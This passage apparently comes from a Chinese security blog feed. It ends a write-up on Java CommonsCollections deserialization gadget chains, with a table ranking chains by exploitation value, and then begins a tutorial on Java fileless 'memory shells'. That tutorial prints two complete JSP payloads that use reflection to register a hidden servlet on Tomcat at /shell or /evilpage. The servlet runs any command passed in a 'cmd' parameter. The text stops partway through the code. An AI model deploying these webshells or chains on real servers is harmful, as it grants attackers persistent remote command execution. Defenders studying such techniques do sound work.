<li>K1: CommonsCollections &lt;&#x3D; 3.2.1</li>
<li>K2: CommonsCollections &#x3D;&#x3D; 4.0</li>
</ul>
<h2 id="利用链-9"><a href="#利用链-9" class="headerlink" title="利用链"></a>利用链</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java.util.HashMap.readObject()</span><br><span class="line">    java.util.HashMap.hash()</span><br><span class="line">        TiedMapEntry.hashCode()</span><br><span class="line">            TiedMapEntry.getValue()</span><br><span class="line">            LazyMap.get()</span><br><span class="line">                ChainedTransformer.transform()</span><br></pre></td></tr></table></figure>

<h2 id="分析-9"><a href="#分析-9" class="headerlink" title="分析"></a>分析</h2><p>K3 这个链其实就是我上面写的 6，ysoserial 中的写法有些啰嗦，所以单独抽出来重新命名了一下。K4 就是 K3 的 4.0 适配版，不再赘述。</p>
<h1 id="修复方式"><a href="#修复方式" class="headerlink" title="修复方式"></a>修复方式</h1><h2 id="3-2-1"><a href="#3-2-1" class="headerlink" title="3.2.1"></a>3.2.1</h2><p>在 3.2.2 中对几个高危反序列化点都加了检查</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream is)</span> <span class="keyword">throws</span> ClassNotFoundException, IOException &#123;</span><br><span class="line">    FunctorUtils.checkUnsafeSerialization(InvokerTransformer.class);</span><br><span class="line">    is.defaultReadObject();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// FunctorUtils.checkUnsafeSerialization</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">checkUnsafeSerialization</span><span class="params">(Class clazz)</span> &#123;</span><br><span class="line">    String unsafeSerializableProperty;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        unsafeSerializableProperty = </span><br><span class="line">            (String) AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>() &#123;</span><br><span class="line">                <span class="keyword">public</span> Object <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> System.getProperty(UNSAFE_SERIALIZABLE_PROPERTY);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (SecurityException ex) &#123;</span><br><span class="line">        unsafeSerializableProperty = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="string">&quot;true&quot;</span>.equalsIgnoreCase(unsafeSerializableProperty)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnsupportedOperationException</span>(</span><br><span class="line">                <span class="string">&quot;Serialization support for &quot;</span> + clazz.getName() + <span class="string">&quot; is disabled for security reasons. &quot;</span> +</span><br><span class="line">                <span class="string">&quot;To enable it set system property &#x27;&quot;</span> + UNSAFE_SERIALIZABLE_PROPERTY + <span class="string">&quot;&#x27; to &#x27;true&#x27;, &quot;</span> +</span><br><span class="line">                <span class="string">&quot;but you must ensure that your application does not de-serialize objects from untrusted sources.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>没有使用黑名单策略，如果配置里没有启用，反序列化功能就会被完全禁用掉。</p>
<h2 id="4-0"><a href="#4-0" class="headerlink" title="4.0"></a>4.0</h2><p>直接把一些敏感类的 Serializable 接口去掉了..</p>
<ul>
<li><em><em><strong>WARNING</strong>: from v4.1 onwards this class will not be serializable anymore</em> in order to prevent potential remote code execution exploits. Please refer to</em> <font color="blue">COLLECTIONS-580 </font></li>
</ul>
<ul>
<li>for more details.*</li>
</ul>
<h2 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h2><p>除了对 CommonsCollections 本身的修复，JDK 对 AnnotationInvocationHandler 这个非常好用的类也做了些防护，在 8u71 中, 对 readObject 做了一些修改</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// sun.reflect.annotation.AnnotationInvocationHandler#readObject</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="type">GetField</span> <span class="variable">var2</span> <span class="operator">=</span> var1.readFields();</span><br><span class="line">    <span class="type">Class</span> <span class="variable">var3</span> <span class="operator">=</span> (Class)var2.get(<span class="string">&quot;type&quot;</span>, (Object)<span class="literal">null</span>);</span><br><span class="line">    <span class="type">Map</span> <span class="variable">var4</span> <span class="operator">=</span> (Map)var2.get(<span class="string">&quot;memberValues&quot;</span>, (Object)<span class="literal">null</span>);</span><br><span class="line">    <span class="type">AnnotationType</span> <span class="variable">var5</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        var5 = AnnotationType.getInstance(var3);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalArgumentException var13) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">Map</span> <span class="variable">var6</span> <span class="operator">=</span> var5.memberTypes();</span><br><span class="line">    <span class="type">LinkedHashMap</span> <span class="variable">var7</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>();</span><br><span class="line"></span><br><span class="line">    String var10;</span><br><span class="line">    Object var11;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">Iterator</span> <span class="variable">var8</span> <span class="operator">=</span> var4.entrySet().iterator(); var8.hasNext(); var7.put(var10, var11)) &#123;</span><br><span class="line">        <span class="type">Entry</span> <span class="variable">var9</span> <span class="operator">=</span> (Entry)var8.next();</span><br><span class="line">        var10 = (String)var9.getKey();</span><br><span class="line">        var11 = <span class="literal">null</span>;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">var12</span> <span class="operator">=</span> (Class)var6.get(var10);</span><br><span class="line">        <span class="keyword">if</span> (var12 != <span class="literal">null</span>) &#123;</span><br><span class="line">            var11 = var9.getValue();</span><br><span class="line">            <span class="keyword">if</span> (!var12.isInstance(var11) &amp;&amp; !(var11 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                var11 = (<span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(var11.getClass() + <span class="string">&quot;[&quot;</span> + var11 + <span class="string">&quot;]&quot;</span>)).setMember((Method)var5.members().get(var10));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    AnnotationInvocationHandler.UnsafeAccessor.setType(<span class="built_in">this</span>, var3);</span><br><span class="line">    AnnotationInvocationHandler.UnsafeAccessor.setMemberValues(<span class="built_in">this</span>, var7);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意到最终反序列化出的 <code>memberValues</code> 已经不是我们原始的 <code>lazyMap</code> 了，而是一个新的 <code>LinkedHashMap</code>，这样所有 <code>AnnotationInvocationHandler</code> 搭配 lazymap 的利用链全都失效了。这也是我不太喜欢这些利用链的原因，它们不仅有库的依赖，还有环境的依赖。那么哪些是高价值利用链，哪些是没有环境依赖就能打的，我们来总结一下。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><table>
<thead>
<tr>
<th align="center">名称</th>
<th align="left">利用链</th>
<th align="center">依赖</th>
<th align="center">推荐程度</th>
<th align="center">备注</th>
</tr>
</thead>
<tbody><tr>
<td align="center">CC1</td>
<td align="left">AnnotationInvocationHandler<br />LazyMap.decorate<br />ChainedTransformer<br />InvokerTransformer</td>
<td align="center">CC &lt;&#x3D; 3.2.1<br />Java &lt; 8u71</td>
<td align="center">低</td>
<td align="center">可改造以支持 4.0</td>
</tr>
<tr>
<td align="center">CC2</td>
<td align="left">PriorityQueue<br />TransformingComparator<br />InvokerTransformer<br />TemplatesImpl</td>
<td align="center">CC4.0</td>
<td align="center">中</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">CC3</td>
<td align="left">AnnotationInvocationHandler<br />LazyMap.decorate<br />ChainedTransformer<br />InstantiateTransformer<br />TrAXFilter<br />TemplatesImpl</td>
<td align="center">CC &lt;&#x3D; 3.2.1<br />Java &lt; 8u71</td>
<td align="center">低</td>
<td align="center">可改造以支持 4.0</td>
</tr>
<tr>
<td align="center">CC4</td>
<td align="left">PriorityQueue<br />TransformingComparator<br />ChainedTransformer<br />InstantiateTransformer<br />TrAXFilter<br />TemplatesImpl</td>
<td align="center">CC4.0</td>
<td align="center">中</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">CC5</td>
<td align="left">BadAttributeValueExpException<br />TiedMapEntry.toString<br />LazyMap.decorate<br />ChainedTransformer<br />InvokerTransformer</td>
<td align="center">CC &lt;&#x3D; 3.2.1<br />Java &gt;&#x3D; 8u76<br />SecurityManger 未开启</td>
<td align="center">低</td>
<td align="center">可改造以支持 4.0</td>
</tr>
<tr>
<td align="center">CC6</td>
<td align="left">HashMap<br />TiedMapEntry.hashCode<br />TiedMapEntry.getValue<br />LazyMap.decorate<br />ChainedTransformer<br />InvokerTransformer</td>
<td align="center">CC &lt;&#x3D; 3.2.1</td>
<td align="center">高</td>
<td align="center">可改造以支持 4.0</td>
</tr>
<tr>
<td align="center">CC7</td>
<td align="left">Hashtable&#x2F;HashMap<br />AbstractMap.equals<br />LazyMap.decorate<br />ChainedTransformer<br />InvokerTransformer</td>
<td align="center">CC &lt;&#x3D; 3.2.1</td>
<td align="center">高</td>
<td align="center">可改造以支持 4.0</td>
</tr>
<tr>
<td align="center">k1&#x2F;k2</td>
<td align="left">HashMap.readObject<br />TiedMapEntry.hashCode<br />TiedMapEntry.getValue<br />LazyMap.decorate<br />InvokerTransformer<br />TemplatesImpl</td>
<td align="center">K1: CC &lt;&#x3D; 3.2.1<br />K2: CC &#x3D;&#x3D; 4.0</td>
<td align="center">最高</td>
<td align="center">特别的：可以打 shiro 1.2.24 的默认环境</td>
</tr>
<tr>
<td align="center">K3&#x2F;K4</td>
<td align="left">与 6 一致</td>
<td align="center">K3: CC &lt;&#x3D; 3.2.1<br />K4: CC &#x3D;&#x3D; 4.0</td>
<td align="center">最高</td>
<td align="center">无任何依赖，是 6 的简化版</td>
</tr>
</tbody></table>
<p>CommonsCollections 有两个大版本，K3&#x2F;K4 是这两个版本最好用的两条链，因为它们对环境毫无依赖，仅仅依赖于库本身。其次的 K1&#x2F;K2 是两个使用字节码加载的利用链，TemplatesImpl 在部分环境下反序列化会被 SecurityManager 禁用，但这两个链可以打 shiro 1.2.24 的默认环境，所以也是很有实战价值的。综合来看，K1<del>K4 这四条链可以完整代替且超越之前的 1</del>7，他们加起来代表了 CommonsCollections 各种可能的情况。</p>
<p>最后的最后放一张白白白师傅总结的图</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20220722135624.png"></p>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
        <tag>CC</tag>
      </tags>
  </entry>
  <entry>
    <title>Java内存马 - 重构篇</title>
    <url>/WebShell/JAVA%E5%86%85%E5%AD%98%E9%A9%AC/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a><center>前言</center></h1><p>看了一些内存马的文，感觉基本都写的不全，或者有的东西一笔带过，所以打算写一篇详解的。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown90729456_p0.jpg"></p>
<span id="more"></span>

<blockquote>
<p>还是觉得乱，决定删减前置知识,但是我会吧前置知识列出来（前置知识要学了才看得懂）。</p>
</blockquote>
<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a><center>概述</center></h1><p>内存马又名无文件马，见名知意，指的是无文件落地的webshell，由于传统的webshell需要写入文件，难以逃避防篡改监控。为了与传统的防御手段对抗，衍生出了一种新型的内存WebShell技术，核心思想用一句话概括，<font color="red"><strong>即：利用类加载或Agent机制在JavaEE、框架或中间件的API中动态注册一个可访问的后门。</strong></font></p>
<h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a><center>前置知识</center></h1><ul>
<li><p>Java web三大件</p>
</li>
<li><p>Tomcat</p>
</li>
<li><p>Java 反射</p>
</li>
<li><p>Spring MVC</p>
</li>
<li><p>Java Agent</p>
</li>
<li><p>WebSocket</p>
</li>
</ul>
<h2 id="Filter和Servlet的回顾性总结"><a href="#Filter和Servlet的回顾性总结" class="headerlink" title="Filter和Servlet的回顾性总结"></a>Filter和Servlet的回顾性总结</h2><p>对于基于<code>Filter</code>和<code>Servlet</code>实现的简单架构项目，代码审计的重心集中于找出所有的<code>Filter</code>分析其过滤规则，找出是否有做全局的安全过滤、敏感的URL地址是否有做权限校验并尝试绕过Filter过滤。第二点则是找出所有的<code>Servlet</code>，分析<code>Servlet</code>的业务是否存在安全问题,如果存在安全问题是否可以利用？是否有权限访问？利用时是否被<code>Filter</code>过滤等问题，切勿看到<code>Servlet</code>、JSP中的漏洞点就妄下定论，不要忘了<code>Servlet</code>前面很有可能存在一个全局安全过滤的<code>Filter</code>。</p>
<p><code>Filter</code>和<code>Servlet</code>都是Java Web提供的API，简单的总结了下有如下共同点。</p>
<ol>
<li><p><font color="red"><strong>Filter和Servlet都需要在web.xml或注解(@WebFilter、@WebServlet)中配置，而且配置方式是非常的相似的。</strong></font></p>
</li>
<li><p><font color="green"><strong>Filter和Servlet都可以处理来自Http请求的请求，两者都有request、response对象。</strong></font></p>
</li>
<li><p><font color="purple"><strong>Filter和Servlet基础概念不一样，Servlet定义是容器端小程序，用于直接处理后端业务逻辑，而Filter的思想则是实现对Java Web请求资源的拦截过滤。</strong></font></p>
</li>
<li><p><font color="silver"><strong>Filter和Servlet虽然概念上不太一样，但都可以处理Http请求，都可以用来实现MVC控制器(Struts2和Spring框架分别基于Filter和Servlet技术实现的)。</strong></font></p>
</li>
<li><p><font color="blue"><strong>一般来说Filter通常配置在MVC、Servlet和JSP请求前面，常用于后端权限控制、统一的Http请求参数过滤(统一的XSS、SQL注入、Struts2命令执行等攻击检测处理)处理，其核心主要体现在请求过滤上，而Servlet更多的是用来处理后端业务请求上。</strong></font></p>
</li>
</ol>
<h1 id="内存马的发展历史"><a href="#内存马的发展历史" class="headerlink" title="内存马的发展历史"></a>内存马的发展历史</h1><p>内存马早在17年n1nty师傅的<a href="https://mp.weixin.qq.com/s/x4pxmeqC1DvRi9AdxZ-0Lw">Tomcat 源代码调试笔记 - 看不见的 Shell</a>中已初见端倪,因为利用困难，一直不温不火。</p>
<p>18年经过rebeyong师傅使用agent技术加持后，拓展了内存马的使用场景—— <a href="https://www.cnblogs.com/rebeyond/p/9686213.html">利用进程注入”实现无文件不死webshell</a>，然终停留在奇技淫巧上</p>
<p>在各类HW洗礼之后，文件shell明显气数已尽。内存马以救命稻草的身份重回大众视野。20年，LandGrey师傅构造了Spring controller内存马——<a href="https://landgrey.me/blog/12/#top">基于内存 Webshell 的无文件攻击技术研究</a>可以算是一波热潮起</p>
<h1 id="内存马的类型"><a href="#内存马的类型" class="headerlink" title="内存马的类型"></a>内存马的类型</h1><ul>
<li>动态注册 <code>servlet</code>&#x2F;<code>filter</code>&#x2F;<code>listener</code>（使用 <code>servlet-api</code> 的具体实现）</li>
<li>动态注册 <code>interceptor</code>&#x2F;<code>controller</code>（使用框架如 <code>spring</code>&#x2F;<code>struts2</code>）</li>
<li>动态注册使用职责链设计模式的中间件、框架的实现（例如 Tomcat 的 Pipeline &amp; Valve，Grizzly 的 FilterChain &amp; Filter 等等）</li>
<li>使用 <code>java agent</code> 技术写入字节码</li>
<li>使用 WebSocket 通信协议实现的内存马</li>
</ul>
<h1 id="Servlet-API-提供的动态注册机制"><a href="#Servlet-API-提供的动态注册机制" class="headerlink" title="Servlet-API 提供的动态注册机制"></a>Servlet-API 提供的动态注册机制</h1><p>早在 2013 年，国际大站 p2j 就发布了这种特性的一种使用方法：</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20220713171959.png"></p>
<p><code>Servlet</code>、<code>Listener</code>、<code>Filter</code> 由 <code>javax.servlet.ServletContext</code> 去加载，无论是使用 xml 配置文件还是使用 Annotation 注解配置，均由 Web 容器进行初始化，读取其中的配置属性，然后向容器中进行注册。</p>
<p>Servlet 3.0 API 允许使 ServletContext 用动态进行注册，在 Web 容器初始化的时候（即建立ServletContext 对象的时候）进行动态注册。可以看到 ServletContext 提供了 add*&#x2F;create* 方法来实现动态注册的功能。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown20220714102154.png"></p>
<h2 id="Servlet-内存马"><a href="#Servlet-内存马" class="headerlink" title="Servlet 内存马"></a>Servlet 内存马</h2><p>Servlet 是 <code>Server Applet</code>（服务器端小程序）的缩写，用来读取客户端发送的数据，处理并返回结果。也是最常见的 Java 技术之一。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown20220714102459.png"></p>
<p>那么在一次访问到达 Tomcat 时，是如何匹配到具体的 Servlet 的？这个过程简单一点，只有两部走：</p>
<ul>
<li><p><code>ApplicationServletRegistration</code> 的 <code>addMapping</code> 方法调用 <code>StandardContext#addServletMapping</code> 方法，在 mapper 中添加 URL 路径与 Wrapper 对象的映射（Wrapper 通过 this.children 中根据 name 获取）</p>
</li>
<li><p>同时在 <code>servletMappings</code> 中添加 URL 路径与 name 的映射。</p>
</li>
<li><p>实现过程：</p>
<ol>
<li>创建一个恶意的<code>servlet</code></li>
<li>获取当前的<code>StandardContext</code></li>
<li>将恶意<code>servlet</code>封装成<code>wrapper</code>添加到<code>StandardContext</code>的<code>children</code>当中</li>
<li>添加<code>ServletMapping</code>将访问的URL和wrapper进行绑定</li>
</ol>
</li>
</ul>
<p>执行下面的代码，访问当前应用的&#x2F;shell路径，加上cmd参数就可以命令执行</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.PrintWriter&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="comment">// 创建恶意Servlet</span></span><br><span class="line">    <span class="type">Servlet</span> <span class="variable">servlet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Servlet</span>() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig servletConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> ServletConfig <span class="title function_">getServletConfig</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> servletRequest.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                isLinux = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;;</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">            <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\a&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> servletResponse.getWriter();</span><br><span class="line">            out.println(output);</span><br><span class="line">            out.flush();</span><br><span class="line">            out.close();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getServletInfo</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="comment">// 获取StandardContext</span></span><br><span class="line">    org.apache.catalina.loader.<span class="type">WebappClassLoaderBase</span> <span class="variable">webappClassLoaderBase</span> <span class="operator">=</span>(org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardCtx</span> <span class="operator">=</span> (StandardContext)webappClassLoaderBase.getResources().getContext();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 用Wrapper对其进行封装</span></span><br><span class="line">    org.apache.catalina.<span class="type">Wrapper</span> <span class="variable">newWrapper</span> <span class="operator">=</span> standardCtx.createWrapper();</span><br><span class="line">    newWrapper.setName(<span class="string">&quot;jweny&quot;</span>);</span><br><span class="line">    newWrapper.setLoadOnStartup(<span class="number">1</span>);</span><br><span class="line">    newWrapper.setServlet(servlet);</span><br><span class="line">    newWrapper.setServletClass(servlet.getClass().getName());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 添加封装后的恶意Wrapper到StandardContext的children当中</span></span><br><span class="line">    standardCtx.addChild(newWrapper);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 添加ServletMapping将访问的URL和Servlet进行绑定</span></span><br><span class="line">    standardCtx.addServletMapping(<span class="string">&quot;/shell&quot;</span>,<span class="string">&quot;jweny&quot;</span>);</span><br><span class="line">%&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>另一种实现方式：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%@ <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span>%&gt;</span><br><span class="line">&lt;%@ <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span>%&gt;</span><br><span class="line">&lt;%@ <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;javax.servlet.*&quot;</span>%&gt;</span><br><span class="line">&lt;%@ <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;javax.servlet.annotation.WebServlet&quot;</span>%&gt;</span><br><span class="line">&lt;%@ <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;javax.servlet.http.HttpServlet&quot;</span>%&gt;</span><br><span class="line">&lt;%@ <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;javax.servlet.http.HttpServletRequest&quot;</span>%&gt;</span><br><span class="line">&lt;%@ <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;javax.servlet.http.HttpServletResponse&quot;</span>%&gt;</span><br><span class="line">&lt;%@ <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;java.io.IOException&quot;</span>%&gt;</span><br><span class="line">&lt;%@ <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;java.lang.reflect.Field&quot;</span>%&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!-- <span class="number">1</span> request <span class="built_in">this</span> file --&gt;</span><br><span class="line">&lt;!-- <span class="number">2</span> request thisfile/../evilpage?cmd=calc --&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">EvilServlet</span> <span class="keyword">implements</span> <span class="title class_">Servlet</span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig config)</span> <span class="keyword">throws</span> ServletException &#123;&#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getServletInfo</span><span class="params">()</span> &#123;<span class="keyword">return</span> <span class="literal">null</span>;&#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;&#125;    <span class="keyword">public</span> ServletConfig <span class="title function_">getServletConfig</span><span class="params">()</span> &#123;<span class="keyword">return</span> <span class="literal">null</span>;&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest req, ServletResponse res)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="type">HttpServletRequest</span> <span class="variable">request1</span> <span class="operator">=</span> (HttpServletRequest) req;</span><br><span class="line">        <span class="type">HttpServletResponse</span> <span class="variable">response1</span> <span class="operator">=</span> (HttpServletResponse) res;</span><br><span class="line">        <span class="keyword">if</span> (request1.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>)&#123;</span><br><span class="line">            Runtime.getRuntime().exec(request1.getParameter(<span class="string">&quot;cmd&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            response1.sendError(HttpServletResponse.SC_NOT_FOUND);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span>  request.getSession().getServletContext();</span><br><span class="line"><span class="type">Field</span> <span class="variable">appctx</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">appctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appctx.get(servletContext); </span><br><span class="line"><span class="type">Field</span> <span class="variable">stdctx</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">stdctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) stdctx.get(applicationContext); </span><br><span class="line"><span class="type">EvilServlet</span> <span class="variable">evilServlet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EvilServlet</span>();</span><br><span class="line">org.apache.catalina.<span class="type">Wrapper</span> <span class="variable">evilWrapper</span> <span class="operator">=</span> standardContext.createWrapper();</span><br><span class="line">evilWrapper.setName(<span class="string">&quot;evilPage&quot;</span>);</span><br><span class="line">evilWrapper.setLoadOnStartup(<span class="number">1</span>);</span><br><span class="line">evilWrapper.setServlet(evilServlet);</span><br><span class="line">evilWrapper.setServletClass(evilServlet.getClass().getName());</span><br><span class="line">standardContext.addChild(evilWrapper);</span><br><span class="line">standardContext.addServletMapping(<span class="string">&quot;/evilpage&quot;</span>, <span class="string">&quot;evilPage&quot;</span>);</span><br><span class="line">out.println(<span class="string">&quot;动态注入servlet成功&quot;</span>);</span><br><span class="line">%&gt;</span><br><span 